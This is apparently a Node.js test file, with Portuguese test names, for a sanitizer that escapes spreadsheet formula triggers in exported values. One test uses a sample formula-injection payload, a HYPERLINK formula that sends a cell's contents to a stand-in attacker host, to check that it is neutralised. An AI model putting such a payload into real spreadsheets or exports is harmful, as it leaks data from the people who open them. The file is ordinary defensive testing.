'use strict';

const test = require('node:test');
const assert = require('node:assert');
const { sanitizeForSpreadsheet } = require('../src/shared/csvsafe.js');

test('neutraliza os quatro gatilhos de fórmula no início do valor', () => {
  assert.strictEqual(sanitizeForSpreadsheet('=SUM(A1:A9)'), "'=SUM(A1:A9)");
  assert.strictEqual(sanitizeForSpreadsheet('+55 61 99999-9999'), "'+55 61 99999-9999");
  assert.strictEqual(sanitizeForSpreadsheet('-1'), "'-1");
  assert.strictEqual(sanitizeForSpreadsheet('@empresa'), "'@empresa");
});

test('caso realista de exfiltração via HYPERLINK', () => {
  const malicious = '=HYPERLINK("http://evil.tld/?"&A1,"clique aqui")';
  const result = sanitizeForSpreadsheet(malicious);
  assert.ok(result.startsWith("'="), 'precisa neutralizar o "=" inicial');
  assert.ok(result.includes(malicious.slice(1)), 'o conteúdo original não pode ser perdido');
});

test('string normal passa intocada', () => {
  assert.strictEqual(sanitizeForSpreadsheet('Café Central'), 'Café Central');
  assert.strictEqual(sanitizeForSpreadsheet('contato@cafe.com.br'), 'contato@cafe.com.br');
});

test('valor não-string passa intocado', () => {
  assert.strictEqual(sanitizeForSpreadsheet(4.6), 4.6);
  assert.strictEqual(sanitizeForSpreadsheet(null), null);
  assert.strictEqual(sanitizeForSpreadsheet(undefined), undefined);
  assert.strictEqual(sanitizeForSpreadsheet(true), true);
});

test('string vazia passa intocada', () => {
  assert.strictEqual(sanitizeForSpreadsheet(''), '');
});

test('tab ou quebra de linha no início também dispara a neutralização', () => {
  assert.strictEqual(sanitizeForSpreadsheet('\tconteúdo'), "'\tconteúdo");
  assert.strictEqual(sanitizeForSpreadsheet('\rconteúdo'), "'\rconteúdo");
});

test('gatilho só conta se estiver no início da string', () => {
  assert.strictEqual(sanitizeForSpreadsheet('valor=teste'), 'valor=teste');
  assert.strictEqual(sanitizeForSpreadsheet('preço: -10'), 'preço: -10');
});
